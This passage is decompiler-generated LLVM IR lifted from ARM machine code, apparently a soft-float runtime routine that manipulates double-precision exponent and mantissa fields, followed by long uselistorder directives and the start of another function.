  %v4_1863c = mul i32 %v1_1863c, 1048576
  %v6_1863c = add i32 %v4_1863c, %v0_1863c
  %v7_1863c = zext i1 %v3_1863c to i32
  %v8_1863c = add i32 %v7_1863c, %v6_1863c
  store i32 %v8_1863c, i32* @r1, align 4
  %v2_18640 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18640, i32* @r4, align 4
  store i32 %v6_184e0, i32* @r5, align 4
  store i32 %v9_184e0, i32* @r6, align 4
  store i32 %v12_184e0, i32* @lr, align 4
  ret i32 %v3_18638

dec_label_pc_18648:                               ; preds = %dec_label_pc_18500
  %v1_18648 = and i32 %v2_18504, -2147483648
  %v4_1864c = urem i32 %v1_184ec, 1048576
  %v5_1864c = or i32 %v1_18648, %v4_1864c
  store i32 %v5_1864c, i32* %r1.global-to-local, align 4
  %v6_18650 = add nsw i32 %v2_18500, 1023
  store i32 %v6_18650, i32* %r4.global-to-local, align 4
  %v8_18650 = sub nsw i32 0, %v2_18500
  %v9_18650 = and i32 %v6_18650, %v8_18650
  %v11_18650 = icmp slt i32 %v2_18500, -1023
  %v12_18650 = icmp eq i32 %v6_18650, 0
  %v7_18654 = icmp sgt i32 %v2_18500, -1023
  br i1 %v7_18654, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_18648
  %v10_18654 = sub nsw i32 1024, %v2_18500
  store i32 %v10_18654, i32* %r5.global-to-local, align 4
  %v14_18654 = and i32 %v10_18654, %v6_18650
  %v16_18654 = icmp slt i32 %v10_18654, 0
  %v17_18654 = icmp eq i32 %v6_18650, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_18648, %bb106
  %v3_18660.in = phi i32 [ %v9_18650, %dec_label_pc_18648 ], [ %v14_18654, %bb106 ]
  %v2_18660 = phi i1 [ %v11_18650, %dec_label_pc_18648 ], [ %v16_18654, %bb106 ]
  %v1_18660 = phi i1 [ %v12_18650, %dec_label_pc_18648 ], [ %v17_18654, %bb106 ]
  %v3_18660 = icmp slt i32 %v3_18660.in, 0
  %v3_18658 = xor i1 %v3_18660, %v2_18660
  %v4_18658 = or i1 %v1_18660, %v3_18658
  br i1 %v4_18658, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1865884 = mul i32 %v6_18650, 1048576
  %v10_1865885 = or i32 %v9_1865884, %v5_1864c
  store i32 %v10_1865885, i32* %r1.global-to-local, align 4
  store i32 %v3_184e0, i32* %r4.global-to-local, align 4
  store i32 %v6_184e0, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_18660 = phi i32 [ %v12_184e0, %bb108 ], [ %v1_18648, %bb107 ]
  %v6_18660 = xor i1 %v4_18658, true
  call void @__pseudo_cond_branch(i1 %v6_18660, i32 %v0_18660)
  %v0_18664 = load i32, i32* %r1.global-to-local, align 4
  %v1_18664 = or i32 %v0_18664, 1048576
  store i32 %v1_18664, i32* @r1, align 4
  %v0_1866c = load i32, i32* %r4.global-to-local, align 4
  %v1_1866c = add i32 %v0_1866c, -1
  store i32 %v1_1866c, i32* @r4, align 4
  %v3_1866c = sub i32 0, %v0_1866c
  %v4_1866c = and i32 %v0_1866c, %v3_1866c
  %v5_1866c = icmp slt i32 %v4_1866c, 0
  store i1 %v5_1866c, i1* @cpsr_v, align 1
  %v6_1866c = icmp slt i32 %v1_1866c, 0
  store i1 %v6_1866c, i1* @cpsr_n, align 1
  %v7_1866c = icmp eq i32 %v0_1866c, 1
  store i1 %v7_1866c, i1* @cpsr_z, align 1
  %v0_18670 = call i32 @function_1833c()
  store i32 %v0_18670, i32* @r0, align 4
  %v0_18678 = call i32 @function_1833c()
  store i32 %v0_18678, i32* @r0, align 4
  %v0_1867c.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_18680.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1867c

dec_label_pc_1867c:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1867c.pre-phi = phi i32 [ %v5_184f0, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_184f0, %bb91 ], [ %v5_184f0, %.thread ]
  %v0_18680 = phi i32 [ %v5_184ec, %.thread1 ], [ %v5_184ec, %.thread2 ], [ %v5_184ec, %bb91 ], [ %v0_18680.pre, %.thread ]
  %v2_18684 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1867c.pre, %.thread ]
  %v5_1867c = and i32 %v2_18684, %v4_1867c.pre-phi
  store i32 %v5_1867c, i32* @r5, align 4
  %v4_18680 = icmp eq i32 %v2_18684, %v0_18680
  br i1 %v4_18680, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1867c
  %v5_18684 = icmp eq i32 %v5_1867c, %v2_18684
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1867c, %bb109
  %v0_18688 = phi i1 [ false, %dec_label_pc_1867c ], [ %v5_18684, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_18688, i32 ptrtoint (i32* @global_var_184d0.731 to i32))
  %v0_1868c = load i32, i32* @r4, align 4
  %v1_1868c = load i32, i32* %ip.global-to-local, align 4
  %v4_1868c = icmp eq i32 %v1_1868c, %v0_1868c
  br i1 %v4_1868c, label %dec_label_pc_18694, label %dec_label_pc_186b0

dec_label_pc_18694:                               ; preds = %bb110
  %v0_18694 = load i32, i32* @r0, align 4
  %v1_18694 = load i32, i32* @r1, align 4
  %v4_18694 = mul i32 %v1_18694, 4096
  %v5_18694 = or i32 %v4_18694, %v0_18694
  store i32 %v5_18694, i32* %r4.global-to-local, align 4
  %v1_18698 = icmp ne i32 %v5_18694, 0
  call void @__pseudo_cond_branch(i1 %v1_18698, i32 ptrtoint (i32* @global_var_184d0.731 to i32))
  %v0_1869c = load i32, i32* @r5, align 4
  %v1_1869c = load i32, i32* %ip.global-to-local, align 4
  %v1_186a0 = icmp ne i32 %v1_1869c, %v0_1869c
  call void @__pseudo_cond_branch(i1 %v1_186a0, i32 ptrtoint (i32* @global_var_184b4.732 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_186ac = call i32 @function_184d0(i32 %arg3, i32 %arg4)
  store i32 %v2_186ac, i32* @r0, align 4
  %v1_186b0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_186b0

dec_label_pc_186b0:                               ; preds = %bb110, %dec_label_pc_18694
  %v1_186b0 = phi i32 [ %v1_1868c, %bb110 ], [ %v1_186b0.pre, %dec_label_pc_18694 ]
  %v0_186b0 = load i32, i32* @r5, align 4
  %v4_186b0 = icmp eq i32 %v0_186b0, %v1_186b0
  br i1 %v4_186b0, label %dec_label_pc_186b8, label %dec_label_pc_186b0.dec_label_pc_186cc_crit_edge

dec_label_pc_186b0.dec_label_pc_186cc_crit_edge:  ; preds = %dec_label_pc_186b0
  %v0_186cc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_186cc

dec_label_pc_186b8:                               ; preds = %dec_label_pc_186b0
  %v4_186b8 = mul i32 %arg4, 4096
  %v5_186b8 = or i32 %v4_186b8, %arg3
  store i32 %v5_186b8, i32* %r5.global-to-local, align 4
  %v7_186b8 = icmp eq i32 %v5_186b8, 0
  call void @__pseudo_cond_branch(i1 %v7_186b8, i32 ptrtoint (i32* @global_var_18464.733 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_186c8 = call i32 @function_184d0(i32 %arg3, i32 %arg4)
  store i32 %v2_186c8, i32* @r0, align 4
  br label %dec_label_pc_186cc

dec_label_pc_186cc:                               ; preds = %dec_label_pc_186b0.dec_label_pc_186cc_crit_edge, %dec_label_pc_186b8
  %v0_186cc = phi i32 [ %v0_186cc.pre, %dec_label_pc_186b0.dec_label_pc_186cc_crit_edge ], [ %v2_186c8, %dec_label_pc_186b8 ]
  %v1_186cc = load i32, i32* @r1, align 4
  %v3_186cc = mul i32 %v1_186cc, 2
  %v4_186cc = or i32 %v3_186cc, %v0_186cc
  store i32 %v4_186cc, i32* %r6.global-to-local, align 4
  %v6_186cc = icmp eq i32 %v4_186cc, 0
  br i1 %v6_186cc, label %dec_label_pc_186cc._crit_edge, label %bb111

dec_label_pc_186cc._crit_edge:                    ; preds = %dec_label_pc_186cc
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_186cc
  %v4_186d0 = mul i32 %arg4, 2
  %v5_186d0 = or i32 %v4_186d0, %arg3
  store i32 %v5_186d0, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_186d0, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_186cc._crit_edge, %bb111
  %v4_186e0.pre-phi = phi i32 [ %.pre80, %dec_label_pc_186cc._crit_edge ], [ %v5_186d0, %bb111 ]
  %v0_186d4 = phi i1 [ false, %dec_label_pc_186cc._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_186d4, i32 ptrtoint (i32* @global_var_183fc.734 to i32))
  %v0_186d8 = load i32, i32* @r0, align 4
  %v1_186d8 = load i32, i32* @r1, align 4
  %v3_186d8 = mul i32 %v1_186d8, 2
  %v4_186d8 = or i32 %v3_186d8, %v0_186d8
  store i32 %v4_186d8, i32* %r4.global-to-local, align 4
  %v1_186dc = icmp ne i32 %v4_186d8, 0
  call void @__pseudo_cond_branch(i1 %v1_186dc, i32 ptrtoint (i32* @global_var_184b4.732 to i32))
  store i32 %v4_186e0.pre-phi, i32* %r5.global-to-local, align 4
  %v1_186e4 = icmp ne i32 %v4_186e0.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_186e4, i32 ptrtoint (i32* @global_var_18464.733 to i32))
  %v0_186e8 = load i32, i32* @r0, align 4
  %v1_186e8 = load i32, i32* @r1, align 4
  %v2_186e8 = call i32 @function_184d0(i32 %v0_186e8, i32 %v1_186e8)
  store i32 %v2_186e8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v1_186f0 = call i32 @function_18700(i32 %v2_186e8)
  store i32 %v1_186f0, i32* %r0.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v1_186f8 = call i32 @function_18700(i32 %v1_186f0)
  store i32 %v1_186f8, i32* %r0.global-to-local, align 4
  ret i32 %v1_186f8

; uselistorder directives
  uselistorder i32 %v5_186d0, { 1, 0, 2 }
  uselistorder i32 %v1_1868c, { 1, 0 }
  uselistorder i32 %v1_1866c, { 1, 0 }
  uselistorder i32 %v0_1866c, { 3, 1, 0, 2 }
  uselistorder i32 %v10_18654, { 2, 0, 1 }
  uselistorder i32 %v6_18650, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_18648, { 1, 0 }
  uselistorder i32 %v2_18630, { 1, 0, 2 }
  uselistorder i32 %v1_18630, { 1, 0, 2 }
  uselistorder i32 %v1_1862c, { 1, 0, 2 }
  uselistorder i32 %v0_1862c, { 1, 0, 2 }
  uselistorder i1 %v7_18620, { 1, 0 }
  uselistorder i32 %v2_18604, { 1, 0 }
  uselistorder i32 %v3_185f0, { 2, 1, 0 }
  uselistorder i32 %v3_185e4, { 0, 2, 1 }
  uselistorder i32 %v5_185e0, { 2, 0, 1 }
  uselistorder i32 %v6_185d0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_185bc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_185b8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_185c4, { 0, 2, 1 }
  uselistorder i32 %v1_185d0, { 1, 0 }
  uselistorder i32 %v6_185b4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_185a0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1859c, { 0, 2, 1 }
  uselistorder i32 %v0_185a8, { 0, 2, 1 }
  uselistorder i32 %v1_185b4, { 1, 0 }
  uselistorder i32 %v6_18598, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_18584, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1858c, { 0, 2, 1 }
  uselistorder i32 %v1_18598, { 1, 0 }
  uselistorder i32 %v3_1857c, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_18570, { 1, 2, 0 }
  uselistorder i32 %v3_185f013, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_185ec17, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_18570, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1857c, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_18618.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1855c, { 1, 0 }
  uselistorder i32 %v0_18560, { 1, 0 }
  uselistorder i32 %v3_1854c, { 1, 0 }
  uselistorder i1 %v1_18540, { 1, 0 }
  uselistorder i32 %v3_18530, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1852c, { 3, 2, 1, 0 }
  uselistorder i32 %v3_18524, { 2, 1, 0 }
  uselistorder i32 %v5_18520, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_18500, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_184f0, { 2, 3, 1, 0 }
  uselistorder i32 %v5_184f0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_184ec, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_184ec, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_184e0, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 7, 5, 6, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11 }
  uselistorder i32* %ip.global-to-local, { 3, 4, 5, 2, 0, 1, 7, 6 }
  uselistorder i32 (i32)* @function_18700, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_184d0, { 2, 1, 0 }
  uselistorder i32 ()* @function_1833c, { 1, 0 }
  uselistorder i1* @cpsr_n, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 1024, { 2, 0, 12, 13, 3, 14, 1, 15, 16, 17, 4, 5, 9, 10, 11, 6, 8, 18, 7 }
  uselistorder i32 1791, { 1, 0 }
  uselistorder i32 536870912, { 2, 3, 4, 0, 1 }
  uselistorder i32 16, { 1, 9, 7, 8, 10, 31, 103, 104, 111, 113, 11, 114, 12, 116, 117, 48, 118, 120, 125, 126, 127, 33, 32, 49, 128, 13, 129, 130, 165, 166, 145, 146, 50, 88, 89, 90, 91, 115, 112, 2, 51, 131, 132, 133, 134, 39, 40, 41, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 167, 168, 169, 105, 52, 106, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 170, 42, 157, 107, 108, 53, 54, 109, 110, 92, 93, 55, 94, 56, 57, 58, 34, 119, 43, 95, 181, 59, 60, 61, 62, 63, 64, 65, 121, 122, 123, 124, 66, 171, 172, 0, 173, 174, 67, 35, 14, 15, 101, 102, 29, 175, 30, 135, 136, 137, 138, 139, 176, 177, 4, 3, 36, 68, 69, 70, 71, 140, 141, 72, 73, 142, 74, 75, 158, 159, 160, 161, 162, 163, 87, 178, 179, 76, 77, 180, 16, 78, 79, 80, 81, 82, 17, 27, 18, 19, 5, 20, 21, 22, 28, 23, 6, 24, 25, 26, 83, 96, 97, 44, 98, 45, 46, 47, 99, 100, 37, 143, 84, 144, 38, 85, 86, 164 }
  uselistorder i32 8, { 1, 2, 3, 4, 5, 6, 68, 92, 93, 100, 102, 103, 104, 105, 7, 106, 107, 108, 109, 110, 111, 35, 71, 51, 52, 69, 160, 161, 162, 163, 31, 126, 72, 73, 74, 75, 101, 120, 121, 122, 227, 43, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 164, 127, 128, 129, 130, 131, 132, 133, 134, 135, 8, 44, 136, 42, 137, 138, 70, 139, 140, 165, 166, 167, 94, 95, 96, 97, 98, 99, 76, 77, 78, 79, 53, 245, 246, 55, 36, 80, 9, 85, 226, 81, 33, 168, 169, 170, 171, 172, 173, 174, 175, 10, 56, 176, 177, 178, 179, 180, 181, 182, 183, 11, 112, 113, 114, 115, 116, 117, 118, 119, 184, 185, 186, 187, 12, 188, 189, 13, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 207, 200, 201, 202, 203, 57, 26, 204, 205, 206, 58, 59, 14, 208, 209, 210, 211, 213, 214, 60, 15, 215, 16, 212, 90, 91, 39, 216, 47, 48, 45, 46, 27, 28, 40, 41, 49, 247, 123, 217, 218, 219, 141, 142, 65, 143, 144, 145, 146, 32, 147, 61, 62, 148, 149, 150, 50, 151, 152, 153, 154, 29, 30, 155, 156, 157, 63, 220, 221, 222, 34, 223, 224, 225, 82, 83, 54, 67, 37, 17, 18, 24, 19, 66, 38, 20, 21, 25, 22, 64, 23, 84, 86, 87, 88, 89, 124, 125, 158, 159, 0 }
  uselistorder i32 4, { 8, 9, 146, 192, 193, 194, 195, 196, 64, 197, 198, 206, 208, 209, 93, 210, 211, 212, 72, 213, 215, 107, 216, 217, 218, 219, 220, 221, 10, 222, 108, 94, 109, 0, 1, 110, 223, 236, 237, 96, 95, 238, 111, 112, 113, 114, 239, 240, 98, 241, 97, 242, 74, 251, 252, 253, 292, 293, 149, 150, 214, 207, 11, 243, 12, 244, 245, 353, 13, 14, 199, 15, 16, 17, 161, 18, 19, 254, 20, 92, 87, 88, 21, 354, 89, 355, 77, 22, 23, 90, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 24, 373, 374, 375, 376, 377, 378, 76, 379, 380, 381, 382, 383, 384, 25, 26, 91, 385, 294, 99, 255, 256, 257, 258, 261, 262, 263, 264, 265, 266, 73, 267, 268, 269, 270, 271, 295, 272, 115, 200, 201, 202, 203, 204, 205, 27, 151, 152, 153, 154, 28, 155, 386, 116, 100, 387, 29, 388, 117, 148, 162, 163, 164, 83, 165, 118, 30, 156, 119, 157, 120, 81, 158, 176, 121, 177, 178, 347, 348, 349, 350, 31, 159, 160, 75, 82, 298, 299, 300, 301, 302, 303, 122, 123, 32, 304, 305, 306, 307, 308, 309, 310, 311, 124, 296, 297, 224, 225, 226, 227, 228, 229, 230, 231, 232, 33, 233, 234, 235, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 125, 126, 127, 326, 327, 330, 333, 328, 329, 101, 128, 331, 65, 332, 334, 335, 336, 338, 129, 35, 34, 337, 184, 339, 36, 37, 2, 38, 78, 79, 39, 3, 273, 40, 41, 85, 4, 42, 130, 66, 43, 44, 246, 166, 131, 45, 132, 133, 134, 135, 274, 275, 46, 276, 136, 277, 278, 279, 103, 280, 281, 102, 137, 282, 283, 284, 285, 286, 287, 67, 138, 288, 290, 139, 140, 289, 147, 340, 47, 341, 104, 342, 343, 167, 168, 169, 80, 84, 170, 171, 172, 344, 345, 259, 260, 145, 48, 49, 351, 352, 144, 50, 51, 52, 53, 54, 55, 56, 57, 58, 141, 59, 142, 68, 69, 70, 5, 6, 173, 105, 86, 60, 174, 175, 179, 180, 71, 181, 182, 183, 185, 186, 187, 188, 189, 190, 191, 247, 106, 248, 249, 250, 143, 61, 291, 346, 62, 63, 7 }
  uselistorder i32 32, { 76, 77, 78, 79, 16, 17, 24, 61, 62, 19, 20, 80, 18, 25, 81, 82, 83, 84, 23, 85, 64, 66, 67, 73, 30, 63, 74, 68, 65, 75, 26, 21, 86, 31, 12, 87, 88, 32, 104, 69, 70, 29, 28, 27, 33, 37, 34, 38, 35, 39, 36, 40, 41, 71, 72, 42, 50, 51, 49, 52, 53, 54, 55, 56, 57, 44, 45, 1, 46, 2, 47, 4, 3, 43, 48, 58, 99, 22, 100, 101, 102, 89, 90, 11, 91, 0, 59, 92, 93, 94, 95, 96, 97, 13, 103, 6, 5, 8, 7, 14, 15, 10, 9, 98, 60 }
  uselistorder i32 33, { 3, 4, 5, 1, 6, 7, 2, 0 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 90, 12, 13, 14, 89, 98, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 100, 57, 101, 58, 102, 59, 103, 104, 60, 61, 63, 62, 64, 86, 65, 66, 67, 0, 94, 1, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 99, 78, 79, 80, 88, 105, 81, 82, 83, 87, 95, 96, 106, 84, 85, 91, 92, 93, 97 }
  uselistorder i32 1048576, { 17, 0, 1, 2, 18, 19, 11, 3, 4, 5, 20, 6, 7, 21, 22, 13, 14, 8, 9, 23, 24, 25, 15, 26, 10, 16, 12, 27 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 176, 177, 178, 179, 180, 181, 182, 183, 184, 71, 72, 3, 73, 74, 75, 76, 92, 93, 94, 95, 100, 101, 102, 103, 104, 105, 106, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 138, 139, 140, 141, 142, 146, 147, 5, 4, 24, 25, 26, 27, 28, 29, 148, 149, 6, 150, 151, 152, 153, 154, 155, 156, 107, 108, 96, 97, 98, 99, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 77, 7, 78, 79, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 0, 198, 199, 200, 201, 202, 203, 204, 205, 206, 8, 207, 208, 209, 210, 211, 212, 213, 80, 81, 82, 83, 9, 10, 84, 85, 86, 87, 88, 89, 90, 91, 30, 31, 32, 33, 34, 35, 36, 11, 12, 13, 303, 304, 305, 306, 307, 308, 309, 37, 14, 38, 15, 39, 301, 302, 40, 41, 42, 67, 68, 69, 70, 43, 44, 45, 46, 47, 249, 253, 254, 255, 256, 250, 251, 252, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 257, 258, 259, 260, 261, 16, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 277, 279, 273, 274, 275, 276, 278, 280, 143, 144, 145, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 17, 281, 282, 51, 18, 52, 53, 171, 172, 173, 174, 175, 283, 19, 284, 285, 226, 20, 23, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 2, 242, 21, 48, 227, 1, 228, 229, 49, 50, 286, 287, 22, 288, 289, 290, 291, 59, 60, 61, 62, 63, 64, 65, 66, 243, 244, 245, 246, 292, 293, 294, 295, 296, 297, 298, 299, 300, 54, 55, 56, 57, 58, 247, 248 }
  uselistorder i32* @r5, { 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 34, 35, 36, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 147, 153, 154, 155, 156, 159, 160, 161, 162, 163, 164, 165, 166, 1, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 9, 186, 27, 187, 188, 189, 190, 191, 26, 192, 193, 194, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 10, 228, 227, 28, 229, 230, 231, 232, 233, 37, 38, 39, 40, 41, 234, 235, 236, 237, 238, 239, 244, 245, 240, 241, 242, 243, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 11, 312, 313, 43, 44, 45, 46, 47, 48, 49, 50, 51, 157, 158, 148, 149, 150, 12, 151, 152, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 382, 383, 384, 385, 455, 456, 457, 125, 31, 126, 6, 127, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 386, 387, 29, 388, 128, 129, 130, 131, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 2, 331, 332, 333, 334, 335, 336, 132, 15, 133, 134, 13, 135, 136, 137, 138, 139, 140, 14, 141, 142, 143, 144, 145, 146, 52, 16, 53, 54, 55, 56, 32, 42, 17, 57, 58, 59, 60, 61, 470, 18, 471, 472, 480, 481, 62, 63, 64, 65, 66, 67, 68, 473, 474, 475, 476, 69, 70, 71, 72, 73, 74, 75, 76, 77, 110, 111, 112, 78, 79, 80, 81, 82, 477, 478, 479, 83, 84, 85, 86, 389, 390, 394, 395, 396, 397, 398, 391, 392, 393, 195, 196, 197, 19, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 8, 412, 413, 414, 415, 416, 20, 417, 418, 419, 420, 258, 259, 260, 261, 421, 21, 422, 423, 424, 337, 22, 338, 33, 339, 340, 341, 342, 343, 344, 262, 263, 264, 265, 266, 267, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 92, 93, 94, 95, 96, 268, 269, 3, 270, 271, 272, 435, 436, 437, 438, 439, 345, 346, 348, 347, 349, 350, 23, 351, 352, 353, 354, 355, 356, 357, 30, 358, 359, 363, 7, 364, 4, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 87, 88, 89, 360, 361, 362, 90, 91, 440, 441, 442, 443, 444, 445, 24, 446, 447, 101, 102, 103, 104, 105, 106, 107, 108, 109, 375, 376, 377, 378, 379, 380, 448, 449, 450, 451, 452, 25, 453, 454, 97, 98, 5, 0, 99, 100, 113, 381 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_186cc, { 1, 0 }
  uselistorder label %dec_label_pc_186b0, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1867c, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1856c, { 1, 0 }
  uselistorder label %dec_label_pc_18554, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_186fc() local_unnamed_addr {
dec_label_pc_186fc:
  store i32 1, i32* @ip, align 4
  %v0_186fc = load i32, i32* @r0, align 4
  ret i32 %v0_186fc
}

define i32 @function_18700(i32 %arg1) local_unnamed_addr {
dec_label_pc_18700:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_18700 = load i32, i32* @ip, align 4
  %v0_18704 = load i32, i32* @r1, align 4
  %v2_18704 = mul i32 %v0_18704, 2
  %v2_18704.off = add i32 %v2_18704, 4194303
  %tmp = icmp ult i32 %v2_18704.off, 2097152
  %v0_1870c = load i32, i32* @r3, align 4
  %v2_1870c = mul i32 %v0_1870c, 2
  br i1 %tmp, label %dec_label_pc_1875c, label %bb

bb:                                               ; preds = %dec_label_pc_18700
  %v2_1870c.off = add i32 %v2_1870c, 4194303
  %tmp21 = icmp ult i32 %v2_1870c.off, 2097152
  br i1 %tmp21, label %dec_label_pc_18750, label %dec_label_pc_18718

dec_label_pc_18718:                               ; preds = %dec_label_pc_18764, %dec_label_pc_18770, %bb
  %v0_18718 = load i32, i32* %r0.global-to-local, align 4
  %v4_18718 = or i32 %v0_18718, %v2_18704
  store i32 %v4_18718, i32* @ip, align 4
  %v6_18718 = icmp eq i32 %v4_18718, 0
  br i1 %v6_18718, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_18718
  %v1_1871c = load i32, i32* @r2, align 4
  %v5_1871c = or i32 %v1_1871c, %v2_1870c
  store i32 %v5_1871c, i32* @ip, align 4
  %v7_1871c = icmp eq i32 %v5_1871c, 0
  br i1 %v7_1871c, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_18718, %bb10
  %v5_18720 = icmp eq i32 %v0_1870c, %v0_18704
  br i1 %v5_18720, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_18724.pre = load i32, i32* @r2, align 4
